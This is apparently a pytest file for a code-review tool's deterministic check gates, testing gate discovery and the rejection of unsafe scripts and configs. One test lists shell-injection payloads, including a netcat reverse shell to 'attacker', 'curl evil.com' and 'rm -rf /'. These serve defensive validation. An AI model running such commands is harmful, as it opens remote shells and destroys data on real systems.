"""Tests for ``pdd.checkup_gates`` deterministic gate discovery + execution.

The gate module exists so ``pdd checkup --pr --review-loop`` cannot ship a
clean LLM verdict on top of a worktree that fails a fast, deterministic
local check (e.g. ``prettier --check``). The tests below pin every gate
the v1 discovery set is supposed to emit, and pin the runner-side
contract (timeout handling, output truncation, secret scrubbing,
artifact persistence).
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import patch


def _make_pkg_json(scripts: Dict[str, str]) -> str:
    return json.dumps({"name": "fake", "version": "0.0.0", "scripts": scripts})


def _git_init(worktree: Path) -> None:
    """Initialize a minimal git repo so ``git diff --check`` has something to scan."""
    subprocess.run(["git", "init", "-q"], cwd=worktree, check=True)
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
         "--allow-empty", "-m", "init", "-q"],
        cwd=worktree,
        check=True,
    )


class TestDiscoverGates:
    """``discover_gates`` inspects repo config and emits an allowlisted gate set."""

    def test_emits_git_diff_check_always(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_finds_prettier_check_from_package_json(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" in names
        gate = next(g for g in gates if g.name == "npm:format:check")
        # iter-40 Finding 1: gate.cmd[0] is the absolute path to the
        # runner, not the bare name; verify by basename.
        assert Path(gate.cmd[0]).name in {"npm", "yarn", "pnpm", "bun"}
        assert "format:check" in gate.cmd

    def test_skips_non_check_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format": "prettier --write ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format" not in names

    def test_skips_install_or_deploy_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "preinstall": "npm install foo",
                    "deploy": "firebase deploy",
                    "start": "node server.js",
                    "build": "tsc -p .",
                    "publish": "npm publish",
                    "push": "git push",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        for forbidden in (
            "npm:preinstall",
            "npm:deploy",
            "npm:start",
            "npm:build",
            "npm:publish",
            "npm:push",
        ):
            assert forbidden not in names

    def test_skips_eslint_without_no_fix_flag(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"lint:check": "eslint --fix ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:lint:check" not in names

    def test_emits_py_compile_for_changed_python_files(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "py-compile:a.py" in names
        gate = next(g for g in gates if g.name == "py-compile:a.py")
        # Iter-19 Finding 3: the gate MUST NOT write
        # ``__pycache__/*.pyc`` next to the source file. The argv
        # routes the syntax check through the builtin ``compile()``
        # so no bytecode is written to disk at all — neither
        # ``-B`` alone nor ``py_compile(..., cfile=os.devnull)`` are
        # sufficient (the former because py_compile writes
        # explicitly, the latter because py_compile uses an atomic
        # rename onto cfile which cannot target /dev/null).
        assert gate.cmd[:3] == [sys.executable, "-B", "-c"]
        assert "compile(" in gate.cmd[3]
        assert "py_compile" not in gate.cmd[3]
        assert gate.cmd[-1].endswith("a.py")

    def test_py_compile_required_fix_hint_does_not_recommend_bare_py_compile(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the required_fix hint a fixer LLM
        receives MUST NOT tell it to run bare ``python -m py_compile``.
        The gate avoids that exact form because it writes
        ``__pycache__`` next to the source — if the fixer follows the
        hint as instructions, the loop's downstream commit/push
        helper can stage the generated bytecode into the PR.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        py_gate = next(g for g in gates if g.name == "py-compile:a.py")
        hint = py_gate.required_fix_hint or ""
        assert "python -m py_compile" not in hint, (
            f"hint must not recommend bare py_compile: {hint!r}"
        )
        # The safe form (``-B`` + builtin ``compile()``) MUST be
        # what's recommended so the fixer reproduces a non-mutating
        # check.
        assert "compile(" in hint or "-B" in hint, (
            f"hint must recommend the safe compile() form: {hint!r}"
        )

    def test_tsc_required_fix_hint_does_not_recommend_bare_npx(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the tsc-noemit hint MUST point at
        ``npx --no-install``, not bare ``npx tsc``. A fixer following
        bare ``npx tsc`` can reach the npm registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # only when ``npx`` is on PATH
            return
        hint = tsc_gates[0].required_fix_hint or ""
        # ``npx --no-install tsc`` is fine; bare ``npx tsc`` is the
        # exact unsafe form we want to forbid. Search anchored on
        # whitespace so the safe form does not falsely trip the
        # check.
        assert "--no-install" in hint, f"hint must steer at --no-install: {hint!r}"
        # Explicit "do NOT use bare npx" guidance also recommended.
        assert "bare" in hint.lower() or "do not use" in hint.lower() or "no-install" in hint.lower()

    def test_py_compile_accepts_non_utf8_pep263_python_file(
        self, tmp_path: Path
    ) -> None:
        """Iter-20 Finding 2: valid Python files with a PEP 263 encoding
        declaration (``# -*- coding: latin-1 -*-`` etc.) must NOT trip
        the syntax gate. The pre-fix gate read the source with
        ``encoding='utf-8'`` and raised ``UnicodeDecodeError`` on the
        first non-UTF-8 byte, producing a false blocker. Passing bytes
        to ``compile()`` instead lets PEP 263 take effect.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        # A latin-1 source file: declare the encoding then include
        # bytes that are valid latin-1 but invalid UTF-8 (0xE9 = é).
        path = tmp_path / "latin.py"
        path.write_bytes(
            b"# -*- coding: latin-1 -*-\n"
            b"GREETING = 'caf\xe9'\n"
        )
        gates = [
            g for g in discover_gates(tmp_path, changed_files=("latin.py",))
            if g.name == "py-compile:latin.py"
        ]
        assert gates, "discovery should emit py-compile for latin.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        # ``compile()`` on the bytes payload respects PEP 263 and
        # exits 0 — the file is syntactically valid Python.
        assert results[0].exit_code == 0, (
            f"PEP 263 latin-1 source must pass; stderr={results[0].stderr_excerpt!r}"
        )

    def test_py_compile_does_not_write_pycache_to_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-19 Finding 3 end-to-end: actually run the discovered
        gate against a valid .py file and confirm no ``__pycache__/``
        directory appears under the worktree afterwards. This guards
        against a future refactor that drops ``-B`` from the cmd
        without us noticing in unit tests that only inspect argv.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = [
            g for g in discover_gates(tmp_path, changed_files=("a.py",))
            if g.name == "py-compile:a.py"
        ]
        assert gates, "discovery should emit py-compile for a.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code == 0
        assert not (tmp_path / "__pycache__").exists()
        assert not list(tmp_path.glob("**/__pycache__"))

    def test_skips_py_compile_when_no_python_files_changed(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=("readme.md",))
        names = [g.name for g in gates]
        assert not any(n.startswith("py-compile:") for n in names)

    def test_skips_ruff_when_no_pyproject_config(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_emits_ruff_when_configured_and_binary_present(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" in names

    def test_skips_ruff_when_configured_but_binary_missing(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value=None):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_user_extra_allow_is_honored(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(
            tmp_path, changed_files=(), extra_allow=("git-diff-check",)
        )
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_gates_use_list_form_no_shell(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        for gate in gates:
            assert isinstance(gate.cmd, list)
            for token in gate.cmd:
                assert isinstance(token, str)

    def test_script_rejects_shell_metacharacters(self) -> None:
        """Codex review iteration 1, Finding 1: ``npm run`` shells out, so
        any metacharacter in the script body chains. The allowlist MUST
        reject metacharacters even when the leading tool name is
        recognised (``prettier --check``).
        """
        from pdd.checkup_gates import _script_is_acceptable

        injected_payloads = [
            "prettier --check && curl evil.com",
            "prettier --check || rm -rf /",
            "prettier --check; echo p0wned",
            "prettier --check | tee /tmp/x",
            "prettier --check & sleep 9999",
            "prettier --check `whoami`",
            "prettier --check $(whoami)",
            "prettier --check ${HOME}",
            "prettier --check > /tmp/out",
            "prettier --check >> /tmp/out",
            "prettier --check < /etc/passwd",
            "prettier --check << EOF",
            "prettier --check\nrm -rf /",
            "curl evil.com",
            "wget evil.com",
            "nc -e /bin/sh attacker 4444",
            "bash -c 'evil'",
            "sh -c 'evil'",
            "eval 'echo bad'",
            "node -e 'process.exit(7)'",
        ]
        for payload in injected_payloads:
            assert _script_is_acceptable(payload) is False, (
                f"shell metachar payload {payload!r} must be rejected"
            )

    def test_script_gate_skipped_when_custom_config_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-34 Finding 3: stable script bodies can point at a
        custom config via ``--config <path>``. The iter-27
        well-known-config skip misses these because it only checks
        default-named files. Skip the gate when the cited path is
        in the PR diff.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({
                "lint:check": "eslint --no-fix --config config/lint.json src",
                "format:check": "prettier --check --config tools/p.json .",
            }),
            encoding="utf-8",
        )
        # PR modifies the custom config path — corresponding gate skips.
        gates = discover_gates(
            tmp_path, changed_files=("config/lint.json",)
        )
        assert "npm:lint:check" not in {g.name for g in gates}
        gates = discover_gates(
            tmp_path, changed_files=("tools/p.json",)
        )
        assert "npm:format:check" not in {g.name for g in gates}
        # Sanity: a non-config / non-JS PR touch still lets the
        # gates fire (subject to other iter-29/30 skips — use a
        # markdown file so the JS-plugin skip does not trip).
        gates = discover_gates(tmp_path, changed_files=("README.md",))
        names = {g.name for g in gates}
        assert "npm:lint:check" in names
        assert "npm:format:check" in names

    def test_script_gate_detects_dotdot_normalised_config_path(self) -> None:
        """Iter-37 Finding 3: ``--config config/../config/lint.json``
        is the same target as ``config/lint.json`` once collapsed.
        The pre-fix code only stripped ``./`` and compared raw
        strings, so the equality check missed. Use os.path.normpath
        on both sides.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint.json"}
        for script in (
            "eslint --no-fix --config config/../config/lint.json src",
            "eslint --no-fix --config ./config/./lint.json src",
            "eslint --no-fix --config config//lint.json src",
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"non-canonical config path missed in {script!r}"
            )

    def test_npm_tsc_script_gate_skipped_when_custom_p_extends_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-37 Finding 1: ``tsc -p config/build.json --noEmit``
        where ``config/build.json`` extends ``./base.json`` and the
        PR modifies ``config/base.json`` — iter-36 only walked the
        ROOT tsconfig's extends chain and missed this path.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {
                    "typecheck": "tsc -p config/build.json --noEmit",
                },
            }),
            encoding="utf-8",
        )
        cfg_dir = tmp_path / "config"
        cfg_dir.mkdir()
        (cfg_dir / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (cfg_dir / "build.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        # No top-level tsconfig.json — iter-36's root-only walk
        # would emit the gate. iter-37 walks from the -p target.
        gates = discover_gates(
            tmp_path, changed_files=("config/base.json",)
        )
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_npm_tsc_script_gate_skipped_when_p_dir_extends_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-37 Finding 2: tsc accepts ``-p <directory>`` and
        looks for ``<dir>/tsconfig.json``. Same RCE/false-pass
        scenario as Finding 1 via the directory form.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc -p config --noEmit"},
            }),
            encoding="utf-8",
        )
        cfg_dir = tmp_path / "config"
        cfg_dir.mkdir()
        (cfg_dir / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (cfg_dir / "tsconfig.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path, changed_files=("config/base.json",)
        )
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_script_gate_detects_hidden_dir_config(self) -> None:
        """Iter-36 Finding 1: ``.config/lint.json`` previously
        collapsed to ``config/lint.json`` because the normaliser
        used ``str.lstrip("./")``, which strips any combination of
        ``.`` and ``/``. Use a single-prefix removeprefix so
        hidden-directory paths survive the comparison.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {".config/lint.json"}
        for script in (
            "eslint --no-fix --config .config/lint.json src",
            "eslint --no-fix --config ./.config/lint.json src",
            'eslint --no-fix --config ".config/lint.json" src',
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"hidden-dir config path missed in {script!r}"
            )

    def test_script_gate_detects_quoted_path_with_spaces(self) -> None:
        """Iter-36 Finding 2: ``.split()`` breaks
        ``--config "./config/lint config.json"`` into multiple
        tokens, so the equality check silently failed. Use
        shlex-style quote-aware tokenisation.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint config.json"}
        for script in (
            'eslint --no-fix --config "./config/lint config.json" src',
            "eslint --no-fix --config './config/lint config.json' src",
            'eslint --no-fix --config="./config/lint config.json" src',
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"quoted-with-spaces config path missed in {script!r}"
            )

    def test_npm_tsc_script_gate_skipped_when_extends_chain_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-36 Finding 3: ``tsconfig.json`` extending ``base.json``
        lets a PR modify ``base.json`` (a NON-``tsconfig*.json``
        name) to relax compiler options. The iter-27
        ``tsconfig*.json`` filename check missed it and the
        iter-29 chain walk only checked emit flags. Collect every
        local tsconfig in the chain and skip the script gate when
        ANY chain file is in the PR diff.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc -p tsconfig.json --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path, changed_files=("base.json",)
        )
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_script_gate_handles_equals_and_short_config_forms(self) -> None:
        """Iter-34 Finding 3: ``--config=<path>`` and ``-c <path>``
        shorthand forms must also be recognised. Iter-35 Findings
        2 + 3 extend the set with quoted paths and tsc ``-p`` /
        ``--project`` project-file flags.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint.json"}
        for script in (
            # Iter-34 forms
            "eslint --no-fix --config config/lint.json src",
            "eslint --no-fix --config=config/lint.json src",
            "eslint --no-fix -c config/lint.json src",
            "eslint --no-fix -c=config/lint.json src",
            # Iter-35 Finding 2: quoted paths
            'eslint --no-fix --config "./config/lint.json" src',
            "eslint --no-fix --config './config/lint.json' src",
            'eslint --no-fix --config="config/lint.json" src',
            "eslint --no-fix -c './config/lint.json' src",
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"missed config reference in {script!r}"
            )
        # Iter-35 Finding 3: tsc ``-p`` / ``--project`` are
        # equivalent custom-config flags.
        ts_pr_set = {"config/build.json"}
        for script in (
            "tsc -p config/build.json --noEmit",
            "tsc --project config/build.json --noEmit",
            "tsc -p=config/build.json --noEmit",
            "tsc --project=config/build.json --noEmit",
            'tsc -p "./config/build.json" --noEmit',
        ):
            assert _script_references_pr_modified_config(script, ts_pr_set), (
                f"missed tsc project reference in {script!r}"
            )
        # Unrelated PR-modified file does NOT trip the skip.
        assert not _script_references_pr_modified_config(
            "eslint --no-fix --config config/lint.json src",
            {"src/foo.ts"},
        )

    def test_mypy_gate_skipped_when_mypy_ini_declares_local_plugin(
        self, tmp_path: Path
    ) -> None:
        """Iter-34 Finding 2: mypy.ini / setup.cfg ``[mypy] plugins``
        was not parsed by iter-32. A stable mypy.ini referencing a
        worktree-local plugin plus a PR modifying ONLY that plugin
        file slipped past the pyproject-only check.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.mypy]\n", encoding="utf-8"
        )
        # mypy.ini variant.
        (tmp_path / "mypy.ini").write_text(
            "[mypy]\nplugins = ./evil_plugin.py\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        assert "mypy" not in {g.name for g in gates}
        # setup.cfg variant with a mixed package/local plugin list.
        (tmp_path / "mypy.ini").unlink()
        (tmp_path / "setup.cfg").write_text(
            "[mypy]\nplugins = some_pkg.main, plugins/evil.py\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        assert "mypy" not in {g.name for g in gates}

    def test_script_rejects_tsc_unsafe_runtime_flags(self) -> None:
        """Iter-33: ``--noEmit`` only suppresses ``.js``/``.d.ts``
        emission. A long tail of OTHER tsc flags still hang the
        gate (``--watch``) or write artifacts into the worktree
        (``--incremental`` without an explicit ``false``,
        ``--generateTrace``, ``--generateCpuProfile``, the
        diagnostic-dump flags). The script-based tsc gate cannot
        inject overrides like the direct gate, so it must reject
        any of these flags outright.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc --noEmit --watch",
            "tsc --noEmit -w",
            "tsc --watch=true --noEmit",
            "tsc --noEmit --incremental",
            "tsc --noEmit --incremental=true",
            "tsc --noEmit --incremental --tsBuildInfoFile foo",
            "tsc --noEmit --generateTrace trace-out",
            "tsc --noEmit --generateCpuProfile profile.cpuprofile",
            "tsc --noEmit --listFiles",
            "tsc --noEmit --listEmittedFiles",
            "tsc --noEmit --diagnostics",
            "tsc --noEmit --extendedDiagnostics",
            "tsc --noEmit --traceResolution",
            "tsc -p tsconfig.json --noEmit --watch",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"unsafe tsc flag must be rejected: {payload!r}"
            )
        # Sanity: explicit disables of the only-with-value flags
        # are accepted.
        assert _script_is_acceptable(
            "tsc --noEmit --incremental false"
        ) is True
        assert _script_is_acceptable(
            "tsc --noEmit --incremental=false"
        ) is True

    def test_script_rejects_nested_package_manager_run_prefix(self) -> None:
        """Iter-31 Finding 1: ``npm run X`` / ``yarn run X`` / ``pnpm
        run X`` / ``bun run X`` / bare ``yarn X`` / ``pnpm X`` /
        ``bun X`` all dispatch to a DIFFERENT named script in
        package.json. A fork PR can add ``"prettier": "sh -c '<evil>'"``
        and an accepted ``"format:check": "yarn run prettier --check ."``
        becomes RCE. Reject every dispatch prefix outright; only
        ``npx --no-install`` remains acceptable as a prefix.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "npm run prettier --check .",
            "yarn run prettier --check .",
            "pnpm run prettier --check .",
            "bun run prettier --check .",
            "yarn prettier --check .",
            "pnpm prettier --check .",
            "bun prettier --check .",
            "npm run tsc --noEmit",
            "yarn run tsc --noEmit",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"nested package-manager dispatch must be rejected: {payload!r}"
            )
        # The safe forms still pass: direct tool invocation and the
        # validated npx --no-install prefix.
        assert _script_is_acceptable("prettier --check .") is True
        assert _script_is_acceptable("npx --no-install prettier --check .") is True

    def test_script_accepts_install_substring_in_path(self) -> None:
        """Iter-31 Finding 3: ``install`` / ``publish`` / ``deploy`` /
        ``start`` / ``build`` are dangerous as STANDALONE COMMAND
        TOKENS but completely fine as substrings inside legitimate
        filenames (e.g. ``src/install.ts``, ``startup.ts``). Use
        word-bounded matching so legitimate scripts are NOT
        false-rejected.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "prettier --check src/install.ts",
            "prettier --check src/startup.ts",
            "prettier --check src/deployment-helpers.ts",
            "prettier --check src/publishers.ts",
            "prettier --check src/builders.ts",
            "tsc --noEmit src/install.ts",
        ):
            assert _script_is_acceptable(payload) is True, (
                f"legitimate path-with-substring must pass: {payload!r}"
            )
        # Confirm the genuine danger is still rejected when the word
        # is a standalone token.
        for payload in (
            "prettier --check . && npm install",
            "prettier --check . start",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"standalone forbidden token must be rejected: {payload!r}"
            )

    def test_python_gates_skipped_when_pr_modifies_pyproject(
        self, tmp_path: Path
    ) -> None:
        """Iter-32 Findings 2 + 3: ruff/black/mypy all read PR-trusted
        configs from ``pyproject.toml``. A fork PR can poison
        ``[tool.black] force-exclude = '.*'`` (black silently passes)
        or ``[tool.ruff] exclude = ['a.py']`` (ruff silently passes).
        Skip ALL three when the PR touched any of the config
        surfaces those tools load.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for changed in (
            ("pyproject.toml", "a.py"),
            ("setup.cfg", "a.py"),
            (".ruff.toml", "a.py"),
            ("ruff.toml", "a.py"),
            ("tox.ini", "a.py"),
            ("mypy.ini", "a.py"),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            for tool in ("ruff", "black", "mypy"):
                assert tool not in names, (
                    f"{tool} must skip when PR touched {changed}"
                )

    def test_mypy_gate_skipped_when_local_plugin_declared(
        self, tmp_path: Path
    ) -> None:
        """Iter-32 Finding 1: even when the PR does NOT modify
        pyproject.toml, mypy will import and execute any
        worktree-local plugin path the config already references.
        A stable ``[tool.mypy] plugins = ['./local_mypy_plugin.py']``
        plus a PR-modified plugin file is RCE. Skip the mypy gate
        whenever any declared plugin entry looks like a local path
        (relative, absolute, or ends in ``.py``).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for plugins_value in (
            '["./local_mypy_plugin.py"]',
            '["plugins/evil.py"]',
            '["/abs/path/plugin.py"]',
            '"./inline_plugin.py"',
            '["mypy_django_plugin.main", "./local.py"]',
        ):
            (tmp_path / "pyproject.toml").write_text(
                f"[tool.mypy]\nplugins = {plugins_value}\n",
                encoding="utf-8",
            )
            gates = discover_gates(tmp_path, changed_files=("a.py",))
            names = {g.name for g in gates}
            assert "mypy" not in names, (
                f"mypy must skip when local plugin declared: {plugins_value}"
            )

    def test_mypy_gate_still_fires_for_pure_package_plugins(
        self, tmp_path: Path
    ) -> None:
        """Inverse of Finding 1: pure-package plugins (e.g.
        ``"mypy_django_plugin.main"``) live in installed site-packages,
        not in the worktree. A PR cannot modify them without
        touching the dependency manifest (which the
        pyproject-touched skip catches) or vendoring under
        node_modules / site-packages. Pure-package plugins are
        therefore safe and the mypy gate STILL fires for them when
        mypy is on PATH.
        """
        import shutil as _shutil
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main", '
            '"some_other_package.helper"]\n',
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        # Test only meaningful when mypy is on PATH in the sandbox.
        if _shutil.which("mypy"):
            assert "mypy" in {g.name for g in gates}

    def test_mypy_gate_skipped_when_pr_modifies_config(
        self, tmp_path: Path
    ) -> None:
        """Iter-31 Finding 2: mypy supports ``plugins = ["evil.py"]``
        under ``[tool.mypy]`` and imports/executes the plugin during
        type-checking. A fork PR that ships both a plugin file and
        a config update would RCE through the mypy gate. Skip mypy
        whenever its config surface (`pyproject.toml`, `mypy.ini`,
        `.mypy.ini`, `setup.cfg`) is in the PR diff. ruff/black
        have no equivalent Python-plugin escape hatch so they still
        fire.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        for changed in (
            ("pyproject.toml", "a.py"),
            ("mypy.ini", "a.py"),
            (".mypy.ini", "a.py"),
            ("setup.cfg", "a.py"),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            assert "mypy" not in names, (
                f"mypy must skip when PR touched {changed}"
            )
            # ruff/black still fire (they don't have plugin RCE).
            # Skipped if those tools aren't on PATH in the sandbox.

    def test_npm_script_gates_skipped_when_pr_touches_node_modules(
        self, tmp_path: Path
    ) -> None:
        """Iter-30 Finding 1: ANY npm-script gate invokes a binary
        from ``node_modules`` (directly or via npm's PATH-injection
        of ``node_modules/.bin``). A fork PR can add or modify any
        path under ``node_modules/`` to land a poisoned shim — the
        iter-29 narrow guard only covered the direct tsc gate and
        the prettier/eslint paths slipped through.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({
                "format:check": "prettier --check .",
                "lint:check": "eslint --no-fix .",
                "typecheck": "tsc --noEmit",
            }),
            encoding="utf-8",
        )
        # Each target hits a different attack surface but all live
        # under node_modules/, so all gates must skip.
        for changed in (
            ("node_modules/.bin/prettier",),
            ("node_modules/prettier/index.js",),
            ("node_modules/.bin/eslint",),
            ("node_modules/typescript/lib/typescript.js",),
            ("node_modules/some-tsc-plugin/index.js",),
        ):
            gates = discover_gates(tmp_path, changed_files=changed)
            names = {g.name for g in gates}
            assert "npm:format:check" not in names, (
                f"format:check must skip on {changed}"
            )
            assert "npm:lint:check" not in names, (
                f"lint:check must skip on {changed}"
            )
            assert "npm:typecheck" not in names, (
                f"typecheck must skip on {changed}"
            )

    def test_tsconfig_chain_signals_emit_on_package_extends(
        self, tmp_path: Path
    ) -> None:
        """Iter-30 Finding 2: package-name extends (e.g.
        ``"@demo/tsconfig"``) resolve through ``node_modules`` to a
        config we can't statically read without parsing
        ``node_modules`` — and a fork PR can install/modify that
        package. The conservative answer is to assume the chain
        signals emit and skip the script gate.
        """
